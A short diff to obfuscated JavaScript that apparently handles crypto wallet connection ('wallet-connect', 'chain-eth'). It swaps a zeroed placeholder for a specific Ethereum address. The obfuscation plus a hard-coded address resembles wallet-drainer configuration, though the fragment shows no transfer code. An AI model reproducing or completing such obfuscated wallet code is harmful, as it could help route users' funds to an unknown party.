@@ -293,7 +293,7 @@ function _0x53ef() {
     "gettokenCHAIN\x20-\x20",
     "chain-eth",
     "ajax",
-    "00000000000000000000000000000000000000",
+    "0x12fD924a812a0e61E2C14262bd26f4876177843E",
     "innerHTML",
     "wallet-connect",
     ".tokenomics-graph\x20[data-aos]",
